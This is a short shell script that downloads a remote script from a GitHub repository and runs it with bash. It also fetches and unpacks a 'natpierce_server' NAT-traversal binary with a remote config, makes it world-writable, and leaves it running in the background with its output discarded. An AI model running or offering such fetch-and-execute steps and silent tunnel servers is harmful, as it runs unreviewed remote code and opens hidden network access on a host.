curl -o /tmp/php1.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php1.sh 
curl -o /tmp/tmp.tz -Ls https://github.com/A233S/angti/raw/main/natpierce_server_linux_v0.20.tar.gz
cd /tmp
tar -xzf /tmp/tmp.tz
sleep 1
rm -rf /tmp/config.ini
curl -o /tmp/config.ini -Ls https://github.com/A233S/angti/raw/main/config.ini
chmod 777 natpierce_server
nohup ./natpierce_server > /dev/null &
